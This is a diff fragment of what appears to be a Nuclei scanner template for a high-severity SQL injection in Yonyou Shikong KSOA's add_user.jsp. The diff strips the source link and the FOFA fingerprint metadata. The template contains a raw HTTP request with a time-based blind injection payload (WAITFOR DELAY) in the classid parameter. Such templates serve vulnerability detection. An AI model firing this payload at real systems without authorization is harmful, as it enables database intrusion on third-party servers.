@@ -3,12 +3,8 @@ info:
   name: 用友-时空KSOA add_user.jsp classid 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/liruec8ymbre1nrx'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: liruec8ymbre1nrx
-    fofa: app="用友-时空KSOA"
 http:
 - raw:
   - 'GET /cardcase/add_user.jsp?classid=1'')%3bWAITFOR+DELAY+''0%3a0%3a5''-- HTTP/1.1
